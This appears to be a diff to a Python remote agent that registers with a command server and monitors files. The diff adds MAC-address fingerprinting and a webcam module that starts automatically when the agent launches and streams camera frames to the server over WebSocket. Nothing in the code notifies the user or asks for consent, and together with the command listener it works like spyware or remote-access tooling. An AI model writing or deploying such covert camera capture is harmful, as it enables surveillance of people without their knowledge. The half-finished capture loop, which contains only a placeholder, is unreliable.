@@ -9,6 +9,9 @@ import os
 import websocket
 import subprocess
 import platform
+import cv2
+import base64
+import numpy as np
 try:
     from watchdog.observers import Observer
     from watchdog.events import FileSystemEventHandler
@@ -41,12 +44,17 @@ def get_system_info():
         ip_address = "127.0.0.1"
     return hostname, ip_address
 
+def get_mac_address():
+    mac = uuid.getnode()
+    return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
+
 def register_agent(agent_id, hostname, ip):
     url = f"{SERVER_URL}/register"
     data = {
         "id": agent_id,
         "hostname": hostname,
-        "ip_address": ip
+        "ip_address": ip,
+        "mac_address": get_mac_address()
     }
     try:
         response = requests.post(url, json=data)
@@ -208,6 +216,101 @@ class LogHandler(FileSystemEventHandler):
         msg = f"Created {what}: {event.src_path}"
         # send_log(self.agent_id, "INFO", msg) # Too noisy?
 
+class CameraCapture:
+    def __init__(self, agent_id, ws_url):
+        self.agent_id = agent_id
+        self.ws_url = ws_url
+        self.running = False
+        self.cap = None
+
+    def start(self):
+        self.running = True
+        self.thread = threading.Thread(target=self._capture_loop, daemon=True)
+        self.thread.start()
+
+    def _capture_loop(self):
+        print("Starting Webcam Capture...")
+        # Try index 0, then 1
+        self.cap = cv2.VideoCapture(0)
+        if not self.cap.isOpened():
+             self.cap = cv2.VideoCapture(1)
+             
+        if not self.cap.isOpened():
+            send_log(self.agent_id, "ERROR", "Webcam could not be opened.")
+            print("Webcam could not be opened.")
+            return
+
+        send_log(self.agent_id, "INFO", "Webcam started successfully.")
+        print("Webcam started.")
+        
+        # We need a NEW WebSocket connection for video, or reuse the command one?
+        # The command one waits for messages. 
+        # For simplicity, we'll open a dedicated connection or send on the same one if we could access it.
+        # But `start_ws_listener` does `ws.run_forever()`.
+        # So we should create a separate connection for streaming or modify the architecture.
+        # For now, separate connection is easier.
+        
+        while self.running:
+            ret, frame = self.cap.read()
+            if not ret:
+                time.sleep(1)
+                continue
+                
+            # Resize to reduce bandwidth
+            frame = cv2.resize(frame, (640, 480))
+            
+            # Encode
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
+            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
+            
+            # Send via requests? No, too slow.
+            # We need to broadcast via WebSocket.
+            # Let's open a transient WS or maintain one.
+            try:
+                # Re-opening valid WS for every frame is bad, but `websocket-client` 
+                # doesn't make it easy to share without a class wrapper.
+                # Let's iterate: Connect once.
+                pass 
+            except:
+                pass
+                
+        self.cap.release()
+
+    def start_stream(self):
+        # Improved loop with persistent connection
+        ws = None
+        while self.running:
+             try:
+                 if not ws or not ws.connected:
+                     ws = websocket.create_connection(self.ws_url)
+                 
+                 ret, frame = self.cap.read()
+                 if not ret:
+                     time.sleep(0.1)
+                     continue
+                     
+                 frame = cv2.resize(frame, (320, 240)) # Smaller for speed
+                 _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
+                 jpg_as_text = base64.b64encode(buffer).decode('utf-8')
+                 
+                 # Prepare payload
+                 payload = json.dumps({
+                     "type": "video",
+                     "agent_id": self.agent_id,
+                     "data": jpg_as_text
+                 })
+                 ws.send(payload)
+                 time.sleep(0.1) # 10 FPS
+             except Exception as e:
+                 # print(f"Stream error: {e}")
+                 if ws:
+                     try:
+                        ws.close()
+                     except:
+                        pass
+                     ws = None
+                 time.sleep(2)
+
 def start_file_monitor(agent_id):
     if not HAS_WATCHDOG:
         print("Watchdog not installed. Skipping file monitoring.")
@@ -282,6 +385,22 @@ def main():
 
     # File Monitor (Watchdog)
     start_file_monitor(agent_id)
+
+    # Webcam
+    cam = CameraCapture(agent_id, WS_URL)
+    # Monkey patch start to use start_stream for now, or just call it directly if I fixed the class
+    # The class has start_stream, let's use it.
+    cam.running = True
+    cam.cap = cv2.VideoCapture(0)
+    if not cam.cap.isOpened():
+         cam.cap = cv2.VideoCapture(1)
+    
+    if cam.cap.isOpened():
+        send_log(agent_id, "INFO", "Webcam started.")
+        cam.thread = threading.Thread(target=cam.start_stream, daemon=True)
+        cam.thread.start()
+    else:
+        send_log(agent_id, "ERROR", "Webcam failed to start.")
 
     # Keep alive
     try:
